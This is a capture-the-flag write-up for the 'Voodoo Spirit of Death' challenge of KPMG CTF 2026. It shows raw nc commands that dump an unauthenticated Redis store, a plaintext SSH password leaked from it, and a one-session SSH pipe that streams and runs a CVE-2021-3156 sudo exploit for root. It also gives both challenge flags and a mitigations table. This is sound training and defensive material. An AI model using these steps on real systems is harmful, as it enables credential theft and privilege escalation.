---
link: 'writeups/kpmg-ctf-2026/voodoo-spirit-of-death'
title: "Voodoo Spirit of Death - KPMG CTF 2026"
description: "Writeup for Voodoo Spirit of Death (Parts 1 & 2) from KPMG CTF 2026. Unauthenticated Redis leaking SSH credentials, followed by a CVE-2021-3156 (Baron Samedit) sudo heap overflow to root."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Infrastructure
  - Redis
  - Credential Leak
  - CVE-2021-3156
  - Baron Samedit
  - Privilege Escalation
  - Sudo
---

# KPMG CTF 2026 — Voodoo Spirit of Death

---

## Challenge Description

> An Acme Operations web portal sits behind a login form. Alongside it, an unauthenticated Redis instance and an SSH service are exposed. Gain a shell, find the user flag, and escalate to root.

**Services:**
- Web: `http://kicyber-66d0f22e3636-vodoo-spirit-of-deat-0-0.chals.io`
- SSH: `0.cloud.chals.io:16632` (Part 1) / `0.cloud.chals.io:32447` (Part 2)
- Redis: `0.cloud.chals.io:26366`

**Flags:** Two — user-level (`maya.chen`) and root (`/root/root.txt`).

---

## Step 1 — Service Discovery

```sh
nmap -Pn -sV --version-light -p 16632,26366 0.cloud.chals.io
```

| Port | Service |
|---|---|
| `16632` | OpenSSH |
| `26366` | Redis (unauthenticated) |

The web portal returned an "Invalid email or password" error for any credentials — no default bypass available from the login form alone.

---

## Step 2 — Plundering the Redis Instance

Redis accepted commands without authentication. `redis-cli` wasn't available on Arch, so raw protocol was sent over `nc`:

```sh
printf 'PING\r\n' | nc -nv -w 3 165.227.210.30 26366
# +PONG

printf 'INFO keyspace\r\n' | nc -nv -w 3 165.227.210.30 26366
# db0:keys=33,...

printf 'SCAN 0 COUNT 100\r\n' | nc -nv -w 3 165.227.210.30 26366
```

33 keys across the database — message threads, session records, cached account data, notifications, job queues.

A helper function made individual queries clean:

```sh
r() { printf '%s\r\n' "$*" | nc -w 3 165.227.210.30 26366; }

r TYPE 'message:thread:dm-baron-maya'
# +string

r GET 'message:thread:dm-baron-maya'
```

The DM thread from **Baron Samedit** to **Maya Chen** contained temporary SSH credentials for the staging/maintenance servers:

```text
Username: maya.chen
Password: Onboard-Maya25!
```

![Redis credentials found](/img/posts/kpmg-ctf-2026-19_vodoo_redis_creds.webp)

> [!NOTE]
> The Redis scan also exposed an active session cookie for Maya. Using it as `acme_session` granted portal access as Maya — but the SSH path was the intended route.

> [!CAUTION]
> `HGETALL` and `LRANGE` both returned `WRONGTYPE` errors here — all values were plain strings. Always check the key type with `TYPE` before choosing a read command.

---

## Step 3 — SSH Login and User Flag (Part 1)

```sh
ssh -p 16632 maya.chen@0.cloud.chals.io
# Password: Onboard-Maya25!
```

The shell confirmed `uid=1000(maya.chen)`. `sudo -l` showed no sudoers permissions.

![SSH login as maya.chen](/img/posts/kpmg-ctf-2026-18_vodoo_ssh_login.webp)

Maya's visible home directories (`Documents`, `backups`, `logs`, `scripts`) were dead ends — routine notes and log-rotation scripts. A shallow `find` initially missed the flag. A **recursive** search including hidden directories found it:

```sh
find "$HOME" -type f \( -name 'user.txt' -o -iname '*flag*' \) -print
```

```text
/home/maya.chen/.local/share/acme-agent/.vault/user.txt
```

```sh
cat /home/maya.chen/.local/share/acme-agent/.vault/user.txt
```

### Flag 1 (User)

```text
KPMG_CTF{ArbcuvmYQb9V5XEVOoK2EZoDSNQ4AG9xKm7UdqPalO6n}
```

![User flag](/img/posts/kpmg-ctf-2026-20_vodoo_flag1.webp)

---

## Step 4 — Identifying the Vulnerable Sudo (Part 2)

Part 2 exposed a second SSH port (`32447`). The same Maya credentials worked:

```sh
ssh -p 32447 maya.chen@165.227.210.30
```

Fingerprinting the environment:

```sh
sudo --version | head -1
dpkg-query -W -f='${Version}\n' sudo 2>/dev/null
cat /etc/os-release
ldd --version | head -1
```

![Checking sudo version](/img/posts/kpmg-ctf-2026-21_vodoo_sudo_version.webp)

| Component | Version |
|---|---|
| sudo | `1.8.31` |
| sudo package | `1.8.31-1ubuntu1` |
| OS | Ubuntu 20.04.6 LTS |
| glibc | `2.31` |

This is the exact build affected by **CVE-2021-3156 "Baron Samedit"** — a heap-based buffer overflow in sudo's argument handling that allows any local user to gain a root shell.

> [!IMPORTANT]
> The challenge name "Baron Samedit" was a direct hint — the Redis DM was authored by a user named **Baron Samedit**, named after the CVE nickname.

---

## Step 5 — Exploiting CVE-2021-3156 (Baron Samedit)

Files created in Maya's home disappeared within seconds (cleanup job), so uploading an exploit binary and running it in a separate session was unreliable. The solution was to **stream and execute in one SSH session**:

```sh
# Locally: package the exploit and its helper library
tar -cf - exploit libnss_x | base64 -w 64 > /tmp/ctf-payload.b64
payload_bytes=$(wc -c < /tmp/ctf-payload.b64)

# Stream, extract, and run — all in one connection
{
  cat /tmp/ctf-payload.b64
  printf 'id\nfind /root -maxdepth 3 -type f -name root.txt -print -exec cat {} \\;\nexit\n'
} | ssh -tt -p 32447 maya.chen@165.227.210.30 \
  "stty -echo; mkdir -p ~/poc; head -c $payload_bytes | base64 -d | tar -xf - -C ~/poc && cd ~/poc && chmod +x exploit && ./exploit"
```

![The exploit in action](/img/posts/kpmg-ctf-2026-22_vodoo_exploit.webp)

The exploit output confirmed a root shell:

```text
uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
/root/root.txt
```

![Proof of cleanup](/img/posts/kpmg-ctf-2026-24_vodoo_cleanup.webp)

### Flag 2 (Root)

```text
KPMG_CTF{GL6RNzWvKqdYw-N7TntygaK5OTouvCRdRPDiIBxO0eCw}
```

![Root flag](/img/posts/kpmg-ctf-2026-23_vodoo_flag2.webp)

---

## Mitigations

| Vulnerability | Recommended Fix |
|---|---|
| Unauthenticated Redis exposure | Require `requirepass` in `redis.conf`; bind Redis to `127.0.0.1` only; use network firewall rules |
| Credentials leaked via Redis DM | Never store plaintext credentials in message queues or cache layers |
| sudo 1.8.31 (CVE-2021-3156) | Upgrade sudo to ≥ `1.8.32` / `1.9.5p2`; apply Ubuntu security patch |
| Unrestricted internet-facing SSH | Restrict SSH access to a VPN or bastion; use key-only authentication |

---

## References

- [Ubuntu CVE-2021-3156 advisory](https://ubuntu.com/security/CVE-2021-3156)
- [Qualys Baron Samedit analysis](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
- [Sudo 1.8.31 exploit PoC](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit)

---

## Summary

Voodoo Spirit of Death built a clean multi-service attack chain. The unauthenticated Redis instance acted as an internal message store, leaking plaintext SSH credentials from a direct message thread. Those credentials provided a low-privilege shell as `maya.chen`. The host ran sudo `1.8.31` — the exact version affected by CVE-2021-3156 ("Baron Samedit"), a heap overflow in sudo's `-s`/`-i` argument handling. Streaming the exploit binary over a single SSH pipe bypassed the ephemeral home-directory cleanup and delivered a root shell, completing both flags.
